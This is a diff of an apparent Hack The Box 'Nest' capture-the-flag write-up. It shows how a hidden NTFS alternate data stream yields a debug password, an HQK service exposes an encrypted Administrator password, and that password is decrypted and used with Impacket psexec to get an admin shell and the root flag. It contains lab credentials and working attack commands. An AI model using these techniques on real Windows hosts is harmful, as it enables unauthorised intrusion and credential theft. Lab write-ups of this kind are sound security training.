@@ -606,8 +606,6 @@ cat HQK_Config_Backup.xml
 ```
 
 ### Debug Mode Password.txt
-https://www.howtogeek.com/1325/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/
-
 It has 0 bytes so it is empty.
 
 ### HqkLdap.exe
@@ -686,3 +684,125 @@ The main module calls CR class and the conf file should have all the information
 4.  Password will be decrypted
 5.  Hopefully the conf file as some admin info
 
+## Looking for the conf file
+
+https://www.howtogeek.com/1325/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/
+It is possible that the text file is actually not empty.
+
+```
+allinfo "Debug Mode Password.txt"
+altname: DEBUGM~1.TXT
+create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
+access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
+write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
+change_time:    Wed Jul 21 02:47:12 PM 2021 EDT
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+```
+
+```
+ get "Debug Mode Password.txt:P
+getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:iloBytes/sec) (average 0.0 KiloBytes/sec)
+```
+
+```
+cat Debug\ Mode\ Password.txt:Password
+WBQ201953D8w 
+```
+
+port 4386 might have something
+
+We use telnet again, rlwrap allows us to use arrow keys.
+
+```
+rlwrap telnet nest.htb 4386
+Trying 10.129.209.6...
+Connected to nest.htb.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+
+>help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+```
+
+Debug requires password, so we put the password we just obtained
+
+We can find ldap.conf after `setdir ..` -> `setdir LDAP` -> `list`
+
+Finally we have the encrypted password for admin
+```
+showquery 2
+
+Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+```
+
+We can try to use the vb decrypter to get the password
+
+![[Pasted image 20230212155416.png]]
+
+In the encryption part we can replace IV and so on for this specific password.
+```
+"N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256
+ ->
+"667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256
+```
+
+Run the code again in .net fiddle
+`Decrypted: XtH4nkS4Pl4y1nGX`
+
+
+### Running the exe
+
+Eventhough the exe is 32bit, I was not able to run it with 32 bit dnspy, so I used 64 bit version.
+https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8
+
+The code requires a conf file and `HqkDbImport.exe`. I simply created the exe file without anything. We do not need the exe file since DqkDbImport.exe will be called after password decryption.
+
+![[Pasted image 20230212160449.png]]
+
+![[Pasted image 20230212160409.png]]
+
+
+![[Pasted image 20230212160300.png]]
+
+
+We got the same result `Decrypted: XtH4nkS4Pl4y1nGX`
+
+## Login as Administrator
+
+Use Impacket psexec to get the admin shell.
+https://github.com/fortra/impacket
+```
+rlwrap /usr/share/doc/python3-impacket/examples/psexec.py administrator:XtH4nkS4Pl4y1nGX@nest.htb
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on nest.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file cBNKVgTl.exe
+[*] Opening SVCManager on nest.htb.....
+[*] Creating service qfXc on nest.htb.....
+[*] Starting service qfXc.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+```
+
+```
+C:\Users\Administrator\Desktop> type root.txt
+81b9ed25a9f45fbbdd2ad82d329f9189
+```
